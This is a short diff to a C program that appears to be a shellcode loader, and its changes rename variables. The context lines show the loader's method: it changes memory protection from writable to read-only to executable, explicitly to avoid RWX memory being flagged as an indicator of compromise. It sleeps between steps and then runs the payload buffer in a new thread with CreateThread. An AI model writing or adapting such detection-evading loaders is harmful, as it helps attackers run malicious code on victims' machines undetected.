@@ -247,8 +247,8 @@ int main()
     // Now the interesting part where we can leverage sleeping
     // We basically change memory perms like RW -> R -> RX 
     // RWX memory can appear as an IOC
-    DWORD oldProtect;
-    VirtualProtect( addr, sizeof( buf ), PAGE_READONLY, &oldProtect );
+    DWORD old_protect;
+    VirtualProtect( addr, sizeof( buf ), PAGE_READONLY, &old_protect );
     
     __alt_sleepms( SLEEPTIME );
 
@@ -257,9 +257,9 @@ int main()
     __alt_sleepms( SLEEPTIME );
 
     DWORD id;
-    HANDLE hThread = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, &id );
+    HANDLE thread = CreateThread( NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, &id );
 
-    WaitForSingleObject( hThread, INFINITE );
+    WaitForSingleObject( thread, INFINITE );
 
     return 0;
 
